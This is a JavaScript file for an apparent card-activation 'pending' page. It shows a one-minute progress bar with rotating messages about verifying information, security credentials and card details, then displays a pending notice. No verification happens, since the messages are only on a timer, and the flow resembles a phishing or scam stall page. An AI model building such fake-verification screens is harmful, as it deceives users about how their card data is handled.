/**
 * Pending Page JavaScript
 * 1 minute loading animation then show pending message
 */

document.addEventListener('DOMContentLoaded', function() {
    const loadingContainer = document.getElementById('loadingContainer');
    const pendingContainer = document.getElementById('pendingContainer');
    const progressBar = document.getElementById('progressBar');
    const progressPercent = document.getElementById('progressPercent');
    const loadingText = document.getElementById('loadingText');
    
    if (!loadingContainer || !pendingContainer) return;
    
    let progress = 0;
    const duration = 60000; // 60 seconds (1 minute)
    const interval = 100; // Update every 100ms
    const increment = (interval / duration) * 100;
    
    // Loading messages to cycle through
    const messages = [
        'Processing your activation request...',
        'Verifying your information...',
        'Checking security credentials...',
        'Validating card details...',
        'Connecting to verification system...',
        'Performing security checks...',
        'Almost done, please wait...'
    ];
    
    let messageIndex = 0;
    
    // Change message every 8 seconds
    const messageInterval = setInterval(function() {
        messageIndex++;
        if (messageIndex < messages.length) {
            loadingText.textContent = messages[messageIndex];
        } else {
            clearInterval(messageInterval);
        }
    }, 8000);
    
    // Progress animation
    const progressInterval = setInterval(function() {
        progress += increment;
        
        if (progress >= 100) {
            progress = 100;
            clearInterval(progressInterval);
            clearInterval(messageInterval);
            
            // Show pending message after loading complete
            setTimeout(function() {
                loadingContainer.style.display = 'none';
                pendingContainer.style.display = 'block';
                
                // Smooth fade-in animation
                pendingContainer.style.opacity = '0';
                pendingContainer.style.transition = 'opacity 0.5s ease';
                setTimeout(function() {
                    pendingContainer.style.opacity = '1';
                }, 50);
            }, 500);
        }
        
        // Update progress bar and text
        progressBar.style.width = progress + '%';
        progressPercent.textContent = Math.floor(progress);
    }, interval);
});
